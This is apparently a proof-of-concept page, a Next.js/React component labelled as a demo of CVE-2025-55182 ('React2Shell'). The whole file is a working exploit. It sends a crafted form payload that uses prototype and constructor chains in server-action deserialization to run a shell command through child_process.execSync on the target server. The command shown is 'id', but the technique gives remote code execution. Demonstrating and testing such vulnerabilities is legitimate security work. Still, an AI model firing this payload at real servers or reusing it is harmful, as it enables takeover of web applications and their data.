export default function Home() {
  const sendPoc = async () => {
    const form = new FormData();

    // Example of the crafted chunks (much like in python PoC)
    const crafted = {
      then: "$1:__proto__:then",
      status: "resolved_model",
      reason: -1,
      value: JSON.stringify({ then: "$B0" }),
      _response: {
        _prefix: "process.mainModule.require('child_process').execSync('id').toString().trim();",
        _formData: { get: "$1:constructor:constructor" },
      },
    };

    form.append("0", JSON.stringify(crafted));
    form.append("1", '"$@0"');

    const resp = await fetch('/api/poc', {
      method: 'POST',
      body: form,
      headers: {
        'Next-Action': 'x'
      }
    });
    const txt = await resp.text();
    alert("Server response: " + txt);
  };

  return (
    <div style={{ padding: 20 }}>
      <h1>React2Shell / CVE-2025-55182 Demo</h1>
      <button onClick={sendPoc}>Send PoC exploit</button>
    </div>
  );
}
